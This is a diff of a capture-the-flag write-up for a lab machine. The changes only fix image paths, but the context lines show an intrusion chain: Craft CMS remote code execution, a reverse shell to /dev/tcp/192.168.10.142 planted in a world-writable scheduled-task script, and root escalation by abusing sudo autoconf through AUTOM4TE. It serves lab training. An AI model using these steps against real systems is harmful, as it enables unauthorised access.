@@ -86,7 +86,7 @@ nmap -sV -sC 192.168.10.162
 
 The HTTP service redirected to `http://craft.nyx/`, revealing the hostname required to access the application.
 
- ![Stage 02](images/1.png) 
+ ![Stage 02](image/1.png) 
 
 ### 3. 🗂️ Hostname Configuration
 
@@ -108,13 +108,13 @@ The application could then be accessed at:
 http://craft.nyx/
 ```
 
- ![Stage 03](images/2.png) 
+ ![Stage 03](image/2.png) 
 
 ### 4. 🌐 Web Application Enumeration
 
 Browsing to `http://craft.nyx/` revealed the default Craft CMS welcome page. The page referenced the `index.twig` template located in the `templates/` directory, identifying Craft CMS as the web application.
 
- ![Stage 04](images/3.png) 
+ ![Stage 04](image/3.png) 
 
 ### 5. 🧪 Vulnerability Research
 
@@ -137,7 +137,7 @@ A public proof of concept was obtained from the following GitHub repository:
 
 The exploit was downloaded to the Kali machine and prepared for testing against the target.
 
- ![Stage 06](images/5.png) 
+ ![Stage 06](image/5.png) 
 
 ### 7. ⚡ Confirming Remote Code Execution
 
@@ -169,7 +169,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 RCE was confirmed, and the application was executing commands as the web-server account `www-data`.
 
- ![Stage 07](images/6.png) 
+ ![Stage 07](image/6.png) 
 
 ---
 
@@ -208,7 +208,7 @@ A successful connection from `192.168.10.162` was received, providing an interac
 
 > **Port note:** Use the same port in the exploit payload and listener when reproducing the connection.
 
- ![Stage 09](images/7.png) 
+ ![Stage 09](image/7.png) 
 
 ---
 
@@ -231,7 +231,7 @@ zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
 
 The user's home directory was not directly accessible from the `www-data` account.
 
- ![Stage 10](images/8.png) 
+ ![Stage 10](image/8.png) 
 
 ### 11. 🕵️ Discovering Scheduled-Task Files
 
@@ -251,7 +251,7 @@ The search identified the following files:
 
 These files indicated that a systemd service and timer were associated with the user's scheduled task.
 
- ![Stage 11](images/9.png) 
+ ![Stage 11](image/9.png) 
 
 ### 12. 📝 Inspecting the Scheduled-Task Script
 
@@ -269,7 +269,7 @@ ls -l /usr/local/bin/zer0arc4-job.sh
 
 The `rwxrwxrwx` permission mode means that every local user can read, write, and execute the file. This included the compromised `www-data` account.
 
- ![Stage 11](images/10.png) 
+ ![Stage 11](image/10.png) 
 
 The script contents were then inspected:
 
@@ -285,7 +285,7 @@ echo "zer0arc4 scheduled task executed: $(date)" >> /tmp/zer0arc4-job.log
 
 The writable script and its associated systemd service/timer provided the path used to obtain execution as `zer0arc4`.
 
- ![Stage 12](images/11.png) 
+ ![Stage 12](image/11.png) 
 
 ### 13. 🐚 Obtaining a Shell as zer0arc4
 
@@ -295,7 +295,7 @@ echo "bash -c 'bash -i > /dev/tcp/192.168.10.142/4443 0>&1'
 ```
 The new shell was verified with:
 
- ![Stage 13](images/12.png) 
+ ![Stage 13](image/12.png) 
 
 
 ```bash
@@ -308,7 +308,7 @@ whoami
 zer0arc4
 ```
 
- ![Stage 13](images/13.png) 
+ ![Stage 13](image/13.png) 
 
 ### 14. 🚩 Retrieving the User Flag
 
@@ -326,7 +326,7 @@ cat user.txt
 f9020bb8331......
 ```
 
- ![Stage 14](images/14.png) 
+ ![Stage 14](image/14.png) 
 
 ---
 
@@ -357,13 +357,13 @@ Two important details were identified:
 - `zer0arc4` can run `/usr/bin/autoconf` as root without a password.
 - The `AUTOM4TE` environment variable is preserved by sudo through `env_keep+=AUTOM4TE`.
 
- ![Stage 15](images/15.png) 
+ ![Stage 15](image/15.png) 
 
 ### 16. 🧰 Exploiting autoconf with GTFOBins
 
 The [GTFOBins autoconf entry](https://gtfobins.github.io/gtfobins/autoconf/) documents a technique that can spawn a shell by controlling the `AUTOM4TE` environment variable.
 
- ![Stage 17](images/16.png) 
+ ![Stage 16](image/16.png) 
 
 First, the working directory was confirmed:
 
@@ -401,7 +401,7 @@ The sudo-permitted binary was then executed with `AUTOM4TE` pointing to the help
 sudo -u root AUTOM4TE=/home/zer0arc4/temp.ac autoconf
 ```
 
- ![Stage 16](images/17.png) 
+ ![Stage 16](image/17.png) 
 
 ### 17. 🏆 Root Shell and Root Flag
 
@@ -430,7 +430,7 @@ cat /root/root.txt
 b0c8813f76687.....
 ```
 
- ![Stage 17](images/18.png) 
+ ![Stage 17](image/18.png) 
 
 ---
 
